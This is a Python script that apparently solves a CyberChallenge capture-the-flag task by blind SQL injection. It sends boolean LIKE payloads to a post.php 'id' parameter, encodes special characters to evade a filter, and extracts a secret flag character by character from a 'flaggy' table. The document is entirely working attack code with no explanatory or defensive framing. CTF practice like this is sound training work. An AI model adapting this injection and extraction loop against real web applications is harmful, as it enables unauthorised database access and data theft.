import requests
from urllib.parse import quote
import string
from bs4 import BeautifulSoup
from time import sleep

def encode_special_characters(url):
    special_chars = "*;%:=+,/?# "
    encoded_url = ''.join(quote(c) if c in special_chars else c for c in url)
    return encoded_url

url = "http://filtered.challs.cyberchallenge.it/post.php?id=10'"
result = ''
chars = string.ascii_lowercase  + string.ascii_uppercase + string.digits +'_{?}!'

while True:
    for char in chars:
        word = result + char
        payload = f" OR 1=(SELECT 1 FROM flaggy WHERE NOT(now LIKE 'm%' OR NOT now LIKE 'This_time_your_secret_is_CCIT{word}%')); -- "
        encoded_payload = encode_special_characters(payload)
        response = requests.get(url + encoded_payload)
        soup = BeautifulSoup(response.text, 'html.parser')
        paragraphs = soup.find_all('p')

        if len(paragraphs) > 0:
            result += char
            print(result)
            break
